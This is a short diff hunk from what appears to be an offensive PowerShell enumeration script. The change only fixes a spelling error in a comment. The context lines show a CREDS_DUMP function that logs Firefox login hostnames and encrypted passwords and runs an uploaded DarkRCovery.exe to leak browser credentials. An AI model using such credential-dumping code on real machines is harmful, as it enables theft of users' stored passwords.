@@ -856,7 +856,7 @@ function CREDS_DUMP {
         $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
     }
 
-    ## Leak Firefox|Chrome credntials { EXE Coded By 0xyg3n }
+    ## Leak Firefox|Chrome credentials { EXE Coded By 0xyg3n }
     # DarkRCovery requires to be uploaded to $env:TMP { client working dir }
     If(Test-Path "$env:TMP\DarkRCovery.exe"){
         echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
